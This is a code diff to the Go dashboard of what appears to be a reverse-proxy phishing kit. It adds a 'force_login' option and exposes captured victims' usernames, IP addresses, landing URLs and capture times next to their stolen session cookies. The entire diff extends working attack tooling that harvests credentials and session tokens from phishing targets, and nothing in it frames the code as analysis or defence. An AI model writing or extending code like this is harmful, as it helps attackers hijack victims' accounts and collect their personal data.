@@ -206,6 +206,7 @@ func (ds *DashboardServer) handleSystem(w http.ResponseWriter, r *http.Request) 
 		"dns_port":         ds.cfg.GetDnsPort(),
 		"autocert":         ds.cfg.IsAutocertEnabled(),
 		"strip_headers":    ds.cfg.IsStripHeadersEnabled(),
+		"force_login":      ds.cfg.IsForceLoginEnabled(),
 		"unauth_redirect":  ds.cfg.IsUnauthRedirectEnabled(),
 		"block_vpn":        ds.cfg.GetBlockVPN(),
 		"geoip":            ds.cfg.GetGeoIP() != nil,
@@ -539,6 +540,10 @@ func (ds *DashboardServer) handleSessionCookies(w http.ResponseWriter, r *http.R
 	writeJSON(w, 200, map[string]interface{}{
 		"session_id":    id,
 		"phishlet":      s.Phishlet,
+		"username":      s.Username,
+		"remote_addr":   s.RemoteAddr,
+		"landing_url":   s.LandingURL,
+		"create_time":   s.CreateTime,
 		"cookies":       cookies,
 		"target_url":    targetURL,
 		"count":         len(cookies),
@@ -1748,6 +1753,7 @@ func (ds *DashboardServer) handleConfigGet(w http.ResponseWriter, r *http.Reques
 			"unauth_url":         c.GetUnauthUrl(),
 			"unauth_redirect":    c.IsUnauthRedirectEnabled(),
 			"strip_headers":      c.IsStripHeadersEnabled(),
+			"force_login":        c.IsForceLoginEnabled(),
 			"block_vpn":          c.GetBlockVPN(),
 			"dashboard_sub":      c.GetDashboardSubdomain(),
 			"dashboard_user":     c.GetDashboardUser(),
@@ -1865,6 +1871,8 @@ func (ds *DashboardServer) applyConfig(key, value string) error {
 		c.SetUnauthRedirect(parseBool(value))
 	case "strip_headers":
 		c.SetStripHeaders(parseBool(value))
+	case "force_login":
+		c.SetForceLogin(parseBool(value))
 	case "autocert":
 		c.EnableAutocert(parseBool(value))
 		ds.manageCerts(false)
